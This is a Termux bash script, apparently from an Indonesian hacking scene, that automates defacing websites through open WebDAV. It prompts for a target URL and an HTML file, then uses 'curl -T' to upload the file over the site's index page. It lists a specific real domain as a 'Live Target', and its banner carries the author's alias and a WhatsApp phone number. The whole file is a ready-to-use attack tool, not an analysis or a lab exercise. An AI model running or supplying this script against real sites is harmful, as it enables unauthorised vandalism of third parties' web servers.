#!/system/xbin/bash
#RecodeGabakalBikinLuPro

green="\033[32;1m"
yellow="\033[33;1m"
indigo="\033[34;1m"
red="\033[35;1m"
purple="\033[37;1m"
cyan="\033[36;1m"
white="\033[39;1m"
echo
echo $blue"==============================================="
echo $indigo"	~"$cyan"{"$white"Author"$red"}"$green":"$yellow"Frezz"$cyan
echo $indigo"    ~"$cyan"{"$white"Whatsapp"$blue"}"$green":"$yellow"089633462884"$cyan
echo $indigo"    ~"$cyan"{"$blue"Youtube"$cyan"}"$green":"$yellow"FoxzyNime"$blue
echo $blue"==============================================="
echo
echo $green "[1]Deface Webdav"
echo
echo "\033[32;1m"
read -p "@Frezz ~#" pil

if [ $pil = 1 ]
then
clear
figlet -f slant "F R E Z Z"|lolcat
pkg install curl
echo $purple "[WARNING]SIMPAN HTML DEFACE DI MEMORI INTERNAL"
echo $red "[Live Target]"
 echo $white "http://contsol.co.za"
 echo
 echo $red "MASUKIN TARGET"
 echo "\033[32;1m"
read -p "@Frezz ~#" target
echo
echo $red "MASUKIN HTML DEFACE NAMA = index.html"
echo "\033[32;1m"
read -p "@Frezz ~#" html
curl -T /storage/emulated/0/$html $target
echo $red "["$yellow"Done"$red"]"$cyan"»»»"$green" $target"
fi
